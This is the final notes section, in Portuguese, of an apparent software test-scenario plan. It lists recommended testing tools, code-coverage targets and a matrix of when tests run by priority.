## 📝 OBSERVAÇÕES FINAIS

### Ferramentas Recomendadas:

- **Testes unitários:** Jest, Mocha
- **Testes de integração:** Supertest
- **Mocks:** Sinon.js, jest.mock()
- **E2E:** Playwright, Puppeteer
- **Carga:** Artillery, k6, JMeter
- **Segurança:** OWASP ZAP, Burp Suite

### Cobertura de Código Alvo:

- **Statements:** > 85%
- **Branches:** > 80%
- **Functions:** > 90%
- **Lines:** > 85%

### Matriz de Priorização:

| Prioridade | Executar quando |
|-----------|-----------------|
| 🔴 CRÍTICA | Todo commit (CI/CD) |
| 🟠 ALTA | Todo PR (Code Review) |
| 🟡 MÉDIA | Release candidate |
| ⚫ BAIXA | Mensalmente |

---

**FIM DOS CENÁRIOS DE TESTE**
